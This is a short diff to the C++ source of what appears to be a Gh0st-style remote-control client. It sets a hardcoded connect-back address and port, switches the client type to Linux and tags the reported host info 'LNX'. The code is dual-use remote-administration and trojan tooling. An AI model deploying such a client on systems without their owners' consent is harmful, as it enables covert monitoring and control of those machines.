@@ -20,7 +20,7 @@
 int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);
 
 // 远程地址：当前为写死状态，如需调试，请按实际情况修改
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", 6543, CLIENT_TYPE_DLL};
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", "6543", CLIENT_TYPE_LINUX};
 
 // 全局状态
 BOOL g_bExit = FALSE;
@@ -220,6 +220,7 @@ int main() {
     if (freq < 0) freq = parse_cpuinfo(); // 回退到 /proc/cpuinfo
     logInfo.dwCPUMHz = freq > 0 ? static_cast<unsigned int>(freq) : 0;
     logInfo.bWebCamIsExist = 0;
+    strcpy_s(logInfo.szReserved, "LNX");
 
     IOCPClient  *ClientObject = new IOCPClient(g_bExit, false);
     ClientObject->setManagerCallBack(NULL, DataProcess);
